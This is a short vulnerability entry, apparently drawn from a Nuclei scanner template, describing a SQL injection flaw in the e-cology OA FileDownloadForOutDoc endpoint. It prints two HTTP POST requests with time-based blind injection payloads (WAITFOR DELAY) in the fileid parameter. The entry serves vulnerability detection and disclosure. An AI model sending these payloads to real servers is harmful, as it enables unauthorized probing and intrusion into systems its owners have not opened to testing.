# Vulnerability: E-cology FileDownloadForOutDocSQL - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`ecology-oa-file-sqli.yaml`)

## Description
e-cology did not effectively filter the user input, but directly spliced it into the SQL query statement, resulting in SQL injection vulnerabilities in the system

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 15s
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: {{Hostname}}

isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:7'

@timeout: 35s
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: {{Hostname}}

isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:15'
```

